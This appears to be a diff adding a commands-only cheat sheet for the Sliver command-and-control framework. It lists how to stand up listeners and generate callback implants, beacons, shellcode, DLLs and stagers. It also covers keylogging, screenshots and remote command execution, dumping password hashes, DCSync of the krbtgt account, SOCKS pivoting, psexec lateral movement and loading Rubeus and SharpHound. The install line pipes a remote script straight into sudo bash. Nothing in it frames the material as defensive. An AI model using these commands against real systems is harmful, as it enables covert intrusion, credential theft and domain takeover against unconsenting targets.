@@ -1,0 +1,70 @@
+# Sliver C2 — Quick Reference (commands only)
+
+## Install
+curl https://sliver.sh/install | sudo bash
+sliver-server
+
+## Listeners
+https -l 443 -d <your-domain.com>
+http -l 80
+mtls -l 8888
+dns -d <c2.domain.com>
+jobs
+jobs -k <job-id>
+
+## Generate Implants
+generate --http <ip> --os windows --arch amd64 --save implant.exe
+generate --http <ip> --os linux --arch amd64 --save implant
+generate beacon --http <ip> --seconds 30 --jitter 10 --os windows --save beacon.exe
+generate --http <ip> --format shellcode --save implant.bin
+generate --http <ip> --format shared --save implant.dll
+generate stager --lhost <ip> --lport 8443 --protocol tcp --save stager.bin
+implants
+
+## Sessions / Beacons
+sessions
+beacons
+use <session-id>
+use <beacon-id>
+interactive
+background
+
+## Post-Exploitation
+info
+whoami
+getuid
+getpid
+ls
+cd <path>
+download <remote-path>
+upload <local-path> <remote-path>
+shell
+execute -o <command>
+execute-assembly /path/to/Tool.exe <args>
+powershell "<command>"
+screenshot
+keylogger start
+
+## Credential Access
+hashdump
+dcsync -user <domain>\krbtgt
+
+## Pivoting
+socks5 start -P 1080
+portfwd add -b 127.0.0.1:8080 -r <internal-ip>:80
+
+## Lateral Movement
+psexec -t <session-id> <target-ip>
+
+## Armory
+armory install rubeus
+armory install seatbelt
+armory install sharphound
+
+## Multiplayer
+new-operator --name <op> --lhost <server-ip> --save <op>.cfg
+sliver import <op>.cfg
+
+## Profiles
+profiles new --http <ip> --os windows --format exe --name win-http
+profiles generate --name win-http --save implant.exe
